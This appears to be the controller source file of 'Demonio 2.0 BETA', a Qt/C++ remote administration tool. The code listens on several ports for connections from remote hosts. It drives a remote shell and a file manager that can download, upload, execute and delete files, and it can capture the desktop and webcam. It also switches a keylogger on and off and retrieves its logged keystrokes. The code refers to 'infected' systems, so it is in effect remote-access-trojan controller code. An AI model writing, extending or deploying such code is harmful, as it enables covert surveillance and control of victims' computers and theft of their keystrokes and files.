/*
 *  Copyright (C) 2010 Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QTranslator>

MainWindow::MainWindow ( QWidget *parent ) :
    QMainWindow ( parent ),
    ui ( new Ui::MainWindow )
{
  ui->setupUi ( this );
  conexiones = 0;
  activo = 0;
  ventana.activo = 0;
  esconderFrames();
  ui->frameConexion->show();
  // Poner los iconos a la lista de opciones
  QIcon icono;
  icono.addFile("./icons/demonio.png");
  this->setWindowIcon(icono);
  icono.addFile("./icons/modem.png");
  ui->listaOpciones->item(0)->setIcon(icono);
  icono.addFile("./icons/document-preview.png");
  ui->listaOpciones->item(1)->setIcon(icono);
  icono.addFile("./icons/shell.png");
  ui->listaOpciones->item(2)->setIcon(icono);
  icono.addFile("./icons/drive-harddisk.png");
  ui->listaOpciones->item(3)->setIcon(icono);
  icono.addFile("./icons/user-desktop.png");
  ui->listaOpciones->item(4)->setIcon(icono);
  icono.addFile("./icons/camera-web.png");
  ui->listaOpciones->item(5)->setIcon(icono);
  icono.addFile("./icons/input-keyboard.png");
  ui->listaOpciones->item(6)->setIcon(icono);
  icono.addFile("./icons/emblem-important.png");
  ui->listaOpciones->item(7)->setIcon(icono);
  icono.addFile("./icons/face-smile-big.png");
  ui->listaOpciones->item(8)->setIcon(icono);
  icono.addFile("./icons/im-user.png");
  ui->listaOpciones->item(9)->setIcon(icono);

  //Ordenar los frmase en un Layout, frames a la derecha y menu de opciones a la izquierda
  layoutPrincipal = new QGridLayout ( ui->centralWidget );
  layoutPrincipal->addWidget ( ui->listaOpciones );
  layoutPrincipal->addWidget ( ui->frameConexion,0,1 );
  layoutPrincipal->addWidget ( ui->frameInformacion,0,1 );
  layoutPrincipal->addWidget ( ui->frameArchivos,0,1 );
  layoutPrincipal->addWidget ( ui->frameLicencia,0,1 );
  layoutPrincipal->addWidget ( ui->frameShellRemota,0,1 );
  layoutPrincipal->addWidget ( ui->frameMensajes,0,1 );
  layoutPrincipal->addWidget ( ui->frameEscritorio,0,1 );
  layoutPrincipal->addWidget ( ui->frameWebcam,0,1);
  layoutPrincipal->addWidget ( ui->frameChat,0,1 );
  layoutPrincipal->addWidget ( ui->frameKeylogger,0,1 );
  layoutPrincipal->addWidget ( ui->notificacionLabel,1,0,1,-11);
  layoutPrincipal->setColumnStretch ( 1,300 );
  layoutPrincipal->setColumnStretch ( 0,100 );
  ui->gridLayout->setColumnStretch ( 0,1 );
  ui->gridLayout->setColumnStretch ( 2,900 );

  //conexiones de signals y slots
  connect ( ui->servidoresLista,SIGNAL ( itemClicked ( QListWidgetItem* ) ),this,SLOT ( seleccionarServidor() ) );
  connect ( ui->botonEscuchar,SIGNAL ( clicked() ),this,SLOT ( escuchar() ) );
  connect ( ui->botonCerrarServidor,SIGNAL ( clicked() ),this,SLOT ( cerrarServidor() ) );
  connect ( ui->botonPing,SIGNAL ( clicked() ),this,SLOT ( ping() ) );
  connect ( ui->botonArchivos,SIGNAL ( clicked() ),this,SLOT ( abrirVentanaArchivos() ) );
  connect ( ui->botonWebcam,SIGNAL(clicked()),this,SLOT(abrirVentanaWebcam()));
  connect ( ui->botonReiniciar,SIGNAL ( clicked() ),this,SLOT ( reinciar() ) );
  connect ( ui->botonDesinfectar,SIGNAL ( clicked() ),this,SLOT ( desinfectar() ) );
  connect ( ui->botonMostrar,SIGNAL ( clicked() ),this,SLOT ( enviarMensaje() ) );
  connect ( ventana.directoriosLista(),SIGNAL ( itemClicked ( QListWidgetItem* ) ),this,SLOT ( directorioCambio() ) );
  connect ( ventana.botonIr(),SIGNAL ( clicked() ),this,SLOT ( archivosIr() ) );
  connect ( ventana.rutaTexto(),SIGNAL ( returnPressed() ),this,SLOT ( archivosIr() ) );
  connect ( ventana.botonAtras(),SIGNAL ( clicked() ),this,SLOT ( archivosAtras() ) );
  connect ( ventana.botonHome(),SIGNAL ( clicked() ),this,SLOT ( archivosHome() ) );
  connect ( ventana.botonRefresco(),SIGNAL ( clicked() ),this,SLOT ( archivosRefresco() ) );
  connect ( ventana.botonDescargar(),SIGNAL ( clicked() ),this,SLOT ( archivosDescargar() ) );
  connect ( ventana.botonSubir(),SIGNAL ( clicked() ),this,SLOT ( archivosSubir() ) );
  connect ( ventana.botonBorrar(),SIGNAL ( clicked() ),this,SLOT ( archivosBorrar() ) );
  connect ( ventana.botonCarpeta(),SIGNAL ( clicked() ),this,SLOT ( archivosCarpeta() ) );
  connect ( ventana.botonEjecutar(),SIGNAL(clicked()),this,SLOT(archivosEjecutar()));
  connect ( ventana.botonCopiar(),SIGNAL(clicked()),this,SLOT(archivosCopiar()));
  connect ( ventana.botonMover(),SIGNAL(clicked()),this,SLOT(archivosMover()));
  connect ( ventana.botonRenombrar(),SIGNAL(clicked()),this,SLOT(archivosRenombrar()));
  connect ( ventana.botonPrevia(),SIGNAL(clicked()),this,SLOT(archivosPrevia()));
  connect ( ventana.comboUnidad(),SIGNAL(currentIndexChanged(QString)),this,SLOT(cambioComboUnidad()));
  connect ( ui->botonEscritorio,SIGNAL ( clicked() ),this,SLOT ( abrirVentanaEscritorio() ) );
  connect ( ui->menuIdioma,SIGNAL(triggered(QAction*)),this,SLOT(traducir(QAction *)));
  connect ( ui->actionOpciones,SIGNAL(triggered()),this,SLOT(opcionesServidor()));
  connect ( ui->actionAcerca_de_Qt,SIGNAL(triggered()),this,SLOT(showAboutQt()));
  connect ( ui->actionAcerca_de,SIGNAL(triggered()),this,SLOT(about()));
  connect ( ui->actionLicencia,SIGNAL(triggered()),this,SLOT(licencia()));
  connect ( ui->actionSalir,SIGNAL(triggered()),this,SLOT(close()));
  connect ( ui->actionConfigurar_puertos,SIGNAL(triggered()),this,SLOT(opcionesVentanaPuertos()));
  connect ( ui->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
  connect ( ui->botonAbrirChat,SIGNAL(clicked()),this,SLOT(abrirChat()));
  connect ( ui->botonCerrarChat,SIGNAL(clicked()),this,SLOT(cerrarChat()));
  connect ( opcionesPuertos.botonPonerPuertos(),SIGNAL(clicked()),this,SLOT(ponerPuertos()) );
  connect (ui->botonActivarKeylogger,SIGNAL(clicked()),this,SLOT(activarKey()));
  connect (ui->botonDesactivarKeylogger,SIGNAL(clicked()),this,SLOT(desactivarKey()));
  connect (ui->botonRecibirTeclas,SIGNAL(clicked()),this,SLOT(recibirKey()));
  connect (ui->botonLimpiarLog,SIGNAL(clicked()),this,SLOT(limpiarKey()));
  connect (ui->botonInformacion,SIGNAL(clicked()),this,SLOT(pedirInformacion()));
  connect (ui->botonDemoxy,SIGNAL(clicked()),this,SLOT(conectarDemoxy()));
  hilo.start();
  escritorio.moveToThread(&hilo);
}

MainWindow::~MainWindow()
{
  server.close();
  delete ui;
}
void MainWindow::changeEvent ( QEvent *e )
{
  /** En esta funcion vemos cuando llega el evento LanguageChange y retraducimos la interfaz **/
  QMainWindow::changeEvent ( e );
  switch ( e->type() )
    {
    case QEvent::LanguageChange:
      ui->retranslateUi ( this );
      break;
    default:
      break;
    }
}
bool MainWindow::event(QEvent *event)
{
    /** Esta funcion maneja los eventos que llegan a la ventana principal **/
    switch ( event->type() )
    {
    case QEvent::Show:
        util.ventanaEmergente(tr("Esta es una versión BETA lo que significa que no está recomendada para uso diario y puede contener errores, úsala bajo tu propio riesgo"));
        break;
    case QEvent::Close:
        QApplication::exit();
        break;
    default:
        this->QMainWindow::event(event);
    }
    return true;
}
void MainWindow::esconderFrames()
{
  /** Esta funcion esconde todos los frames **/
  ui->frameConexion->hide();
  ui->frameInformacion->hide();
  ui->frameShellRemota->hide();
  ui->frameArchivos->hide();
  ui->frameLicencia->hide();
  ui->frameMensajes->hide();
  ui->frameEscritorio->hide();
  ui->frameWebcam->hide();
  ui->frameChat->hide();
  ui->frameKeylogger->hide();
}
void MainWindow::listaOpciones()
{
  /** Esta funcion es llamada cuando selecionamos algun Item de la lista de opciones **/
  int opcion = ui->listaOpciones->currentIndex().row();
  esconderFrames();
  switch ( opcion )
    {
    case ( 0 ) :
    {
      ui->frameConexion->show();
      break;
    }
    case ( 1 ) :
    {
      ui->frameInformacion->show();
      break;
    }
    case ( 2 ) :
    {
      ui->frameShellRemota->show();
      break;
    }
    case ( 3 ) :
    {
      ui->frameArchivos->show();
      break;
    }
    case ( 4 ) :
    {
      ui->frameEscritorio->show();
      break;
    }
    case ( 5 ) :
    {
      ui->frameWebcam->show();
      break;
    }
    case ( 6 ) :
    {
      ui->frameKeylogger->show();
      break;
    }
    case ( 7 ) :
    {
      ui->frameMensajes->show();
      break;
    }
    case ( 8 ) :
    {
        break;
    }
    case ( 9 ) :
    {
        ui->frameChat->show();
        break;
    }
    default:
    {

    }
    }
}

void MainWindow::showAboutQt()
{
  /** Muestra informacion sobre Qt **/
  QApplication::aboutQt();
}
void MainWindow::licencia()
{
  /** Muestra la licencia **/
  QFile licencia;
  licencia.setFileName ( "./rc/gpl-3.0.txt" );
  licencia.open ( QIODevice::ReadOnly );
  ui->licenciaText->setText ( licencia.readAll() );
  licencia.close();
  esconderFrames();
  ui->frameLicencia->show();
}
void MainWindow::about()
{
  /** Muestra informacion sobre Demonio **/
  util.ventanaEmergente(tr("Demonio 2.0 BETA<br>Programado por: Alberto Pajuelo Montes<br>Email: paju1986@gmail.com<br>Web: <a href=\"http://sourceforge.net/projects/demonio/\">http://sourceforge.net/projects/demonio/</a>"));
}
void MainWindow::opcionesServidor()
{
    /** abre la ventana de opciones del servidor **/
    opciones.show();
}
void MainWindow::opcionesVentanaPuertos()
{
    /** abre la ventana  de configuracion de puertos del cliente **/
    opcionesPuertos.show();
}
void MainWindow::escuchar()
{
  /**pone a escuchar un servidor en el puerto indicado **/
  ui->botonDemoxy->setEnabled(false);
  port = 1234;
  portArchivos = 2345;
  portEscritorio = 3456;
  portWebcam = 4567;
  server.listen ( QHostAddress::Any,port );
  serverArchivos.listen ( QHostAddress::Any,portArchivos );
  serverEscritorio.listen ( QHostAddress::Any,portEscritorio );
  serverWebcam.listen ( QHostAddress::Any,portWebcam );
  connect ( &server,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexion() ) );
  connect ( &serverArchivos,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexionArchivos() ) );
  connect ( &serverEscritorio,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexionEscritorio() ) );
  connect ( &serverEscritorio,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexionWebcam() ) );
  connect ( &mapa,SIGNAL ( mapped ( int ) ),this,SLOT ( desconectado ( int ) ) );
  if ( server.isListening() && serverArchivos.isListening() && serverEscritorio.isListening() && serverWebcam.isListening()) //Si todos los sockets estan escuchando lo notificamos en un mensaje
    {
      ui->notificacionLabel->setText ( tr("Escuchando") );
      ui->botonEscuchar->setEnabled(false);
    }
}
void MainWindow::nuevaConexion()
{
  /** cuando una conexion entrante es escuchada por el servidor se la pasa a un socket libre del array de sockets **/
  socket[conexiones] = server.nextPendingConnection();
  connect ( socket[conexiones],SIGNAL ( readyRead() ),this,SLOT ( llegadaDatos() ) );
  connect ( socket[conexiones],SIGNAL ( disconnected() ),&mapa,SLOT ( map() ) );
  mapa.setMapping ( socket[conexiones],conexiones );
  socket[conexiones]->blockSignals ( true );
  ui->servidoresLista->addItem ( socket[conexiones]->localAddress().toString() ); //mostrar la IP en la lista de servidores
  conexiones++;
}
void MainWindow::nuevaConexionArchivos()
{
    /** Esta funcion se ejecuta cuando se establece una nueva conexion del socket de Archivos **/
  ventana.socketArchivos[ventana.conexiones] = serverArchivos.nextPendingConnection();
  ventana.conexiones++;
}
void MainWindow::nuevaConexionEscritorio()
{
    /** Esta funcion se ejecuta cuando se establece una nueva conexion del socket de capturas de escritorio **/
  escritorio.socketEscritorio[escritorio.conexiones] = serverEscritorio.nextPendingConnection();
  escritorio.conexiones++;
}

void MainWindow::nuevaConexionWebcam()
{
    /** Esta funcion se ejecuta cuando se establece una nueva conexion del socket de capturas de webcam **/
    webcam.socketWebcam[webcam.conexiones] = serverWebcam.nextPendingConnection();
    webcam.conexiones++;
}
void MainWindow::conectarDemoxy()
{
    /** sistema de conexiÃ³n Demoxy **/
    ui->botonEscuchar->setEnabled(false); //No puede estar conectado a demoxy y escuchando conexiones a la vez (Por ahora)
    activo = 0; //Utilizamos el socket 0 para conectar a Demoxy
    socket[activo] = new QTcpSocket(this);
    ventana.socketArchivos[activo] = new QTcpSocket(this);
    escritorio.socketEscritorio[activo] = new QTcpSocket(this);
    webcam.socketWebcam[activo] = new QTcpSocket(this);
    QString host = QInputDialog::getText ( &ventana,"Host","Introduce la direcciÃ³n del host" );
    //Realizamos la conexion en los puertos 1111,2222,3333,4444
    socket[activo]->connectToHost(host,1111);
    ventana.socketArchivos[activo]->connectToHost(host,2222);
    escritorio.socketEscritorio[activo]->connectToHost(host,3333);
    webcam.socketWebcam[activo]->connectToHost(host,4444);
    connect ( socket[activo],SIGNAL ( readyRead() ),this,SLOT ( llegadaDatos() ) );
    //Notificamos si cada socket esta correctamente conectado
    if( ventana.socketArchivos[activo]->state() == QAbstractSocket::ConnectedState )
    {
      ui->notificacionLabel->setText(tr("socket principal conectado a Demoxy"));
    }
    if(escritorio.socketEscritorio[activo]->state() == QAbstractSocket::ConnectedState)
    {
      ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de escritorio conectado a Demoxy."));
    }
    if(webcam.socketWebcam[activo]->state() == QAbstractSocket::ConnectedState)
    {
      ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de webcam conectado a Demoxy."));
    }
}

void MainWindow::llegadaDatos()
{
  /** Esta funcion se ejecuta cuando llegan datos del socket principal **/
  QString datos = socket[activo]->readAll(); //Leemos los datos
  QStringList parametros = datos.split ( "|@|" ); //Separamos los parametros por |@|
  if( parametros[0] == "conectado") //Si la conexiÃ³n proviene a traves de Demoxy
  {
    ui->servidoresLista->addItem("Servidor Demoxy");
  }
  if( datos == "pong") //Si recibe respuesta de un ping
  {
    util.ventanaEmergente("responde");
  }
  if ( parametros[0] == "shell" ) //Si llegan datos de una shell remota
    {
      ui->salidaTexto->setText ( parametros[1] );
    }
  if ( parametros[0] == "home" ) //Si llega la ruta del directorio home
    {
      ventana.establecerRuta ( parametros[1] );
      util.escribirSocket ( "archivos|@|" + parametros[1],socket[activo] );
    }
  if (parametros[0] == "unidades") //Si llega la lista de unidades
  {
    ventana.comboUnidad()->clear();
    ponerUnidades(parametros);
  }
  if ( parametros[0] == "file" ) //Si llega la lista de ficheros
    {
      ponerArchivos ( parametros );
      util.escribirSocket ( "directorios|@|" + ventana.ruta,socket[activo] );
    }
  if ( parametros[0] == "folder" ) //si llega la lista de archivos
    {
      ponerDirectorios ( parametros );
    }
  if (parametros[0] == "chat") { //Si llegan mensajes del chat
      this->ponerMensajeChat(parametros[1],ui->textoNickServidor->text());
  }
  if (parametros[0] == "teclas") //Si llegan teclas del keylogger
  {
    ui->textTeclas->setText(parametros[1]);
  }  
  if (parametros[0] == "informacion") //Si llega informacion del sistema
  {
    //Ponemos cada parametro en su respectiva variable
    QString informacion;
    QString so = parametros[1];
    QString version = parametros[2];
    QString homePath = parametros[3];
    QString tempPath = parametros[4];
    escritorio.ancho = parametros[5].toInt();
    escritorio.alto = parametros[6].toInt();
    QString fecha = parametros[7];
    QString hora = parametros[8];
    this->alias = parametros[9];
    //Mostramos la informacion en pantalla
    informacion = "Sistema operativo: " + so + "<br>";
    informacion = informacion + tr("Versi&oacute;n: ") + version +"<br>";
    informacion = informacion + tr("Directorio del usuario: ") + homePath + "<br>";
    informacion = informacion + tr("Directorio temporal: ") + tempPath + "<br>";
    informacion = informacion + tr("Resoluci&oacute;n de pantalla: ") + parametros[5] + "X" + parametros[6] + "<br>";
    informacion = informacion + tr("Fecha del sistema: ") + fecha + "<br>";
    informacion = informacion + tr("Hora del sistema: ") + hora + "<br>";
    ui->informacionSistemaTexto->setHtml(informacion);
    //La resolucion tambien la ponemos en el titulo de la ventana de captura de pantalla
    this->setWindowTitle(tr("Demonio - Cliente - Conectado a: ") + this->alias);
    util.escribirSocket("unidades|@|",socket[activo]);
  }
}
void MainWindow::seleccionarServidor()
{
  /** se utiliza el indice de la lista para salecionar un socket del array y desbloquearle las seÃ±ales **/
  socket[activo]->blockSignals ( true );
  //El socket activo sera el mismo que el del indice elegido en la lista de servidores conectados
  activo = ui->servidoresLista->currentIndex().row();
  ventana.activo = activo;
  escritorio.activo = activo;
  webcam.activo = activo;
  socket[activo]->blockSignals ( false );
  util.escribirSocket("informacion|@|",socket[activo]);
  ui->notificacionLabel->setText ( "IP: " + ui->servidoresLista->currentItem()->text() );
  if( ventana.socketArchivos[activo]->state() == QAbstractSocket::ConnectedState )
  {
    ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de archivos conectado."));
  }
  if(escritorio.socketEscritorio[activo]->state() == QAbstractSocket::ConnectedState)
  {
    ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de escritorio conectado."));
  }
  if(webcam.socketWebcam[activo]->state() == QAbstractSocket::ConnectedState)
  {
    ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de webcam conectado."));
  }
}
void MainWindow::ping()
{
  /** hacer ping al host remoto **/
  util.escribirSocket ( "ping",socket[activo] );
}
void MainWindow::cerrarServidor()
{
  /** cierra el servdor **/
  util.escribirSocket ( "cerrar",socket[activo] );
}
void MainWindow::desconectado ( int indice )
{
  /** cuando un socket se desconecta se borra de la lista y se reorganiza el array **/
  int j;
  ui->servidoresLista->takeItem ( indice );
  socket[indice]->close();
  ventana.socketArchivos[indice]->close();
  escritorio.socketEscritorio[indice]->close();
  //socket[indice]->~QTcpSocket(); //Da fallo de segmentaciÃ³n al intentar liberar la memoria del socket
  for ( j=indice;conexiones - 1 > j;j++ )
    {
      socket[j] = socket[j + 1];
      ventana.socketArchivos[j] = ventana.socketArchivos[j + 1];
      escritorio.socketEscritorio[j] = escritorio.socketEscritorio[j + 1];
    }
  //Disminuimos los contadores de conexiones
  conexiones--;
  ventana.conexiones--;
  escritorio.conexiones--;
  webcam.conexiones--;
}
void MainWindow::shellEnviar()
{
  /**Esta funcion envia datos a una shell remota **/
  QString datos = "shell|@|" + ui->entradaTexto->text();
  util.escribirSocket ( datos,socket[activo] );
}
void MainWindow::reinciar()
{
  /** Esta funcion envia la orden de reiniciar el servidor **/
  util.escribirSocket ( "reiniciar",socket[activo] );
}
void MainWindow::desinfectar()
{
  /** Esta funcion envia la orden de desinfectar el sistema **/
  util.escribirSocket ( "desinfectar",socket[activo] );
}
void MainWindow::abrirVentanaArchivos()
{
  /** Abre la ventana del administrador de archivos **/
  ventana.limpiarArchivos();
  ventana.show();
}
void MainWindow::abrirVentanaWebcam()
{
    /** Abre la ventana de las capturas de webcam **/
    this->webcam.show();
}
void MainWindow::cambioComboUnidad()
{
    /** Esta funcion se ejecuta cuando se elije una unidad en el administrador de archivos **/
    ventana.limpiarArchivos();
    ventana.establecerRuta ( ventana.comboUnidad()->currentText() );
    util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
}
void MainWindow::ponerUnidades(QStringList unidades)
{
    /**Pone las unidades pasadas como parametros en el combo de unidades **/
    int i;
    for ( i=1;i<unidades.size() -1;i++ )
      {
        ventana.ponerUnidad ( unidades[i] );
      }
}
void MainWindow::ponerArchivos ( QStringList archivos )
{
  /** pone los archivos pasados como parametro en lista de archivos del administrador de archivos **/
  int i;
  for ( i=1;i<archivos.size() -1;i++ )
    {
      ventana.ponerArchivo ( archivos[i] );
    }
}
void MainWindow::ponerDirectorios ( QStringList directorios )
{
  /** pone los directorios pasados como parametros en la lista de directorios del administrador de archivos **/
  int i;
  for ( i=2;i<directorios.size() -1;i++ )
    {
      ventana.ponerDirectorio ( directorios[i] );
    }
}
void MainWindow::directorioCambio()
{
  /**Esta funcion se ejecuta cuando se seleciona un directorio en la lista de directorios del administrador de archivos **/
  QString nuevoDirectorio = ventana.directoriosLista()->currentItem()->text();
  if ( nuevoDirectorio == ".." ) //Si el directorio es .. significa volver atras
    {
      ventana.rutaAnterior = util.obtenerRutaAnterior ( ventana.ruta );
      ventana.establecerRuta ( ventana.rutaAnterior );
      ventana.limpiarArchivos();
      util.escribirSocket ( "archivos|@|" + ventana.rutaAnterior,socket[activo] );
    }
  else
    {
      ventana.ruta = ventana.ruta + "/" + nuevoDirectorio;
      ventana.establecerRuta ( ventana.ruta );
      ventana.limpiarArchivos();
      util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
    }
}
void MainWindow::archivosIr()
{
  /** Esta funcion envia la ruta a la que queremos navegar en el administrador de archivos **/
  ventana.limpiarArchivos();
  ventana.establecerRuta ( ventana.rutaTexto()->text() );
  util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
}
void MainWindow::archivosAtras()
{
  /** Envia la ruta anterios a la que estabamos **/
  ventana.rutaAnterior = util.obtenerRutaAnterior ( ventana.ruta );
  ventana.establecerRuta ( ventana.rutaAnterior );
  ventana.limpiarArchivos();
  util.escribirSocket ( "archivos|@|" + ventana.rutaAnterior,socket[activo] );
}
void MainWindow::archivosHome()
{
  /** pide recibir la ruta del directorio home **/
  ventana.limpiarArchivos();
  util.escribirSocket ( "home",socket[activo] );
}
void MainWindow::archivosRefresco()
{
  /** refresca la vista de archivos **/
  ventana.limpiarArchivos();
  util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
}
void MainWindow::archivosDescargar()
{
    /** Manda descargar un archivo **/
    if( ventana.archivosLista()->currentRow() >= 0) {
        QFileDialog dialogo;
        QString dir;
        dir = QDir::homePath() + "/" + ventana.archivosLista()->currentItem()->text();
        ventana.rutaArchivo = dialogo.getSaveFileName ( this,"Guardar archivo",dir );
        dialogo.show();
        QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
        util.escribirSocket ( "get|@|" + rutaArchivo,socket[activo] );
    }
}
void MainWindow::archivosSubir()
{
  /** Manda subir un archivo **/
  QFileDialog archivo;
  QString nombreArchivo = archivo.getOpenFileName ( this,"Abrir archivo",QDir::homePath() );
  QStringList cachosArchivo = nombreArchivo.split ( "/" );
  util.escribirSocket ( "put|@|" + cachosArchivo[cachosArchivo.size() - 1],socket[activo] );
  ventana.subirArchivo ( nombreArchivo );
}

void MainWindow::archivosBorrar()        
{
    /** Manda borrar un archivo **/
    if( ventana.archivosLista()->currentRow() >= 0) {
        QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
        util.escribirSocket ( "remove|@|" + rutaArchivo,socket[activo] );
    }
}
void MainWindow::archivosCarpeta()
{
  QString nombre = QInputDialog::getText ( &ventana,"Nombre de la carpeta","Nombre de la carpeta" );
  util.escribirSocket ( "createfolder|@|" + nombre,socket[activo] );

}
void MainWindow::archivosEjecutar()
{
    if( ventana.archivosLista()->currentRow() >= 0) {
        QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
        util.escribirSocket ( "execute|@|" + rutaArchivo,socket[activo] );
    }
}
void MainWindow::archivosCopiar()
{
    if(ventana.botonMover()->text() == "Pegar") //Para evitar interferencias con el boton mover
    {
        ventana.botonMover()->setText("Mover");
    }
    if(ventana.botonCopiar()->text() == "Copiar")
    {
        if( ventana.archivosLista()->currentRow() >= 0) {//Para evitar no tener un archivo selecionado
            copiaRuta = ventana.ruta + "/";
            copiaNombre = ventana.archivosLista()->currentItem()->text();
            ventana.botonCopiar()->setText("Pegar");
        }
    }
    else
    {
        ventana.botonCopiar()->setText("Copiar");
        util.escribirSocket("copiar|@|" + copiaRuta + copiaNombre + "|@|" + ventana.ruta + "/" + copiaNombre,socket[activo]);
    }
}
void MainWindow::archivosMover()
{
    if(ventana.botonCopiar()->text() == "Pegar") //Para evitar interferencias con el boton copiar
    {
        ventana.botonCopiar()->setText("Copiar");
    }
    if(ventana.botonMover()->text() == "Mover")
    {
        if( ventana.archivosLista()->currentRow() >= 0) { //Para evitar no tener un archivo selecionado
            copiaRuta = ventana.ruta + "/";
            copiaNombre = ventana.archivosLista()->currentItem()->text();
            ventana.botonMover()->setText("Pegar");
        }
    }
    else
    {
        ventana.botonMover()->setText("Mover");
        util.escribirSocket("mover|@|" + copiaRuta + copiaNombre + "|@|" + ventana.ruta + "/" + copiaNombre,socket[activo]);
    }
}
void MainWindow::archivosRenombrar()
{
    QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
    QString nombre = QInputDialog::getText ( &ventana,"Nuevo nombre","Nuevo nombre" );
    util.escribirSocket ( "renombrar|@|" + rutaArchivo + "|@|" + ventana.ruta + "/" + nombre,socket[activo] );

}
void MainWindow::archivosPrevia()
{
    ventana.rutaArchivo = "mini.jpg";
    QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
    util.escribirSocket ( "previa|@|" + rutaArchivo,socket[activo] );
}
void MainWindow::enviarMensaje()
{
  QString mensaje;
  mensaje = ui->textoMensaje->document()->toPlainText() + "|@|" + ui->textoTitulo->text();
  if ( ui->radioAlerta->isChecked() )
    {
      util.escribirSocket ( "alerta|@|" + mensaje,socket[activo] );
    }
  if ( ui->radioInformacion->isChecked() )
    {
      util.escribirSocket ( "info|@|" + mensaje,socket[activo] );
    }
  if ( ui->radioPeligro->isChecked() )
    {
      util.escribirSocket ( "peligro|@|" + mensaje,socket[activo] );
    }

}

void MainWindow::abrirVentanaEscritorio()
{
  escritorio.show();
}

void MainWindow::abrirChat()
{
    util.escribirSocket("abrirchat",socket[activo]);
}

void MainWindow::cerrarChat()
{
    util.escribirSocket("cerrarchat",socket[activo]);
}

void MainWindow::enviarMensajeChat()
{
    this->ponerMensajeChat(ui->entradaChatTexto->text(),ui->textoNickCliente->text());
    util.escribirSocket ( "chat|@|" + ui->entradaChatTexto->text() + "|@|" + ui->textoNickCliente->text() + "|@|" + ui->textoNickServidor->text() ,socket[activo] );
    ui->entradaChatTexto->clear();
}
void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
{
    ui->salidaChatTexto->document()->setHtml(ui->salidaChatTexto->document()->toHtml() + "<br>" + quien + " dice: " + mensajeChat);
}

void MainWindow::ponerPuertos()
{
    port = opcionesPuertos.puertoPrincipal()->text().toInt();
    portArchivos = opcionesPuertos.puertoArchivos()->text().toInt();
    portEscritorio = opcionesPuertos.puertoEscritorio()->text().toInt();
    portWebcam = opcionesPuertos.puertoWebcam()->text().toInt();
}

void MainWindow::activarKey()
{
    util.escribirSocket("activark|@|",socket[activo]);
}
void MainWindow::desactivarKey()
{
    util.escribirSocket("desactivark|@|",socket[activo]);
}
void MainWindow::recibirKey()
{
    util.escribirSocket("recibirk|@|",socket[activo]);
}
void MainWindow::limpiarKey()
{
    util.escribirSocket("limpiark|@|",socket[activo]);
}
void MainWindow::pedirInformacion()
{
    util.escribirSocket("informacion|@|",socket[activo]);
}
void MainWindow::traducir(QAction *idioma)
{
    /** Seleciona un idioma del menu y traduce la aplicacion **/
    if(idioma->text() == ui->actionEspa_ol->text())
        traductor.load("cliente_es.qm");
    if(idioma->text() == ui->actionEnglish->text())
        traductor.load("cliente_en.qm");
    if(idioma->text() == ui->actionPortugu_s->text())
        traductor.load("cliente_pt.qm");
    if(idioma->text() == ui->actionFran_aise->text())
        traductor.load("cliente_fr.qm");
    if(idioma->text() == ui->actionItaliano->text())
        traductor.load("cliente_it.qm");
    if(idioma->text() == ui->actionAlem_n->text())
        traductor.load("cliente_de.qm");
    QApplication::installTranslator(&traductor);
}
